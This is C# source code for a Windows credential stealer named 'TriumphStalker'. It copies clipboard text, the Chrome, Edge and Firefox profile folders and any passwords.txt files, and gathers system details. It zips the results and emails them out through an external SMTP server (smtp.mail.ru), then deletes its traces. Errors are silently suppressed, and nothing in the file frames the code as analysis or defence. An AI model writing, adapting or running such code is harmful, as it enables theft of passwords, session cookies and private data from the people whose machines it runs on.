using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

class TriumphStalker
{
    static void Main()
    {
        string tempDir = Path.Combine(Path.GetTempPath(), "TriumphLog_" + Guid.NewGuid().ToString().Substring(0, 8));
        Directory.CreateDirectory(tempDir);

        GrabClipboard(tempDir);
        GrabBrowsers(tempDir);
        GrabSystemInfo(tempDir);

        string zipPath = tempDir + ".zip";
        ZipFile.CreateFromDirectory(tempDir, zipPath);

        SendMail(zipPath);
        Directory.Delete(tempDir, true);
        File.Delete(zipPath);
        Environment.Exit(0);
    }

    static void GrabClipboard(string dir)
    {
        try
        {
            if (Clipboard.ContainsText())
            {
                string clip = Clipboard.GetText();
                File.WriteAllText(Path.Combine(dir, "clipboard.txt"), clip);
            }
        }
        catch { }
    }

    static void GrabBrowsers(string dir)
    {
        string[] browsers = {
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data",
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Edge\User Data",
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles"
        };

        string browserDir = Path.Combine(dir, "browsers");
        Directory.CreateDirectory(browserDir);

        foreach (string path in browsers)
        {
            if (Directory.Exists(path))
            {
                string dest = Path.Combine(browserDir, new DirectoryInfo(path).Parent?.Parent?.Name ?? "unknown");
                CopyWithRetry(path, dest);
            }
        }
    }

    static void GrabSystemInfo(string dir)
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine($"Machine: {Environment.MachineName}");
        sb.AppendLine($"User: {Environment.UserName}");
        sb.AppendLine($"OS: {Environment.OSVersion}");
        sb.AppendLine($".NET: {Environment.Version}");
        sb.AppendLine($"Processors: {Environment.ProcessorCount}");
        sb.AppendLine($"64bit: {Environment.Is64BitOperatingSystem}");
        File.WriteAllText(Path.Combine(dir, "sysinfo.txt"), sb.ToString());

        string passPath = Path.Combine(dir, "creds.txt");
        File.WriteAllText(passPath, "[CREDS_RAW]" + Environment.NewLine);

        foreach (string drive in Directory.GetLogicalDrives())
        {
            try
            {
                string marker = Path.Combine(drive, "passwords.txt");
                if (File.Exists(marker)) File.Copy(marker, Path.Combine(dir, "extra_pass.txt"), true);
            }
            catch { }
        }
    }

    static void CopyWithRetry(string src, string dst)
    {
        try
        {
            foreach (string file in Directory.GetFiles(src, "*.*", SearchOption.AllDirectories))
            {
                string rel = Path.GetRelativePath(src, file);
                string target = Path.Combine(dst, rel);
                Directory.CreateDirectory(Path.GetDirectoryName(target));
                for (int i = 0; i < 3; i++)
                {
                    try { File.Copy(file, target, true); break; }
                    catch { Task.Delay(100).Wait(); }
                }
            }
        }
        catch { }
    }

    static void SendMail(string attachmentPath)
    {
        try
        {
            SmtpClient client = new SmtpClient("smtp.mail.ru", 587);
            client.EnableSsl = true;
            client.Credentials = new NetworkCredential("yourbot@mail.ru", "app_pass_here");

            MailMessage msg = new MailMessage();
            msg.From = new MailAddress("yourbot@mail.ru");
            msg.To.Add("target_lab@triumphmania.local");
            msg.Subject = $"Logs from {Environment.MachineName} - {DateTime.Now:yyyyMMddHHmm}";
            msg.Body = "TriumphMania collected dump.";
            msg.Attachments.Add(new Attachment(attachmentPath));

            client.Send(msg);
        }
        catch (Exception e)
        {
            File.WriteAllText(Path.GetTempPath() + "triumph_error.log", e.ToString());
        }
    }
}